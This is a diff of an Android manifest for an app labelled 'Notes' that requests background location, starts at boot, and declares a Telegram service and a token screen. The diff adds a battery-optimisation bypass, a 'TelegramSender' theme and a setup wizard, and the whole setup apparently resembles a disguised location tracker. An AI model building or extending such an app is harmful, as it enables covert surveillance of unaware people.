@@ -15,6 +15,7 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
 
     <application
@@ -22,7 +23,7 @@
         android:label="Notes"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+        android:theme="@style/Theme.TelegramSender">
 
         <receiver
             android:name=".BootReceiver"
@@ -36,7 +37,7 @@
         <activity
             android:name=".LockActivity"
             android:exported="true"
-            android:theme="@style/Theme.AppCompat.NoActionBar"> <!-- Full screenish -->
+            android:theme="@style/Theme.MaterialComponents.DayNight.NoActionBar"> <!-- Compatibility fix -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -48,9 +49,12 @@
             android:exported="true" />
             
         <activity
+            android:name=".ui.SetupWizardActivity"
+            android:exported="false" />
+            
+        <activity
             android:name=".TokenActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.Light.NoActionBar"/>
+            android:exported="false" />
 
         <service
             android:name=".TelegramService"
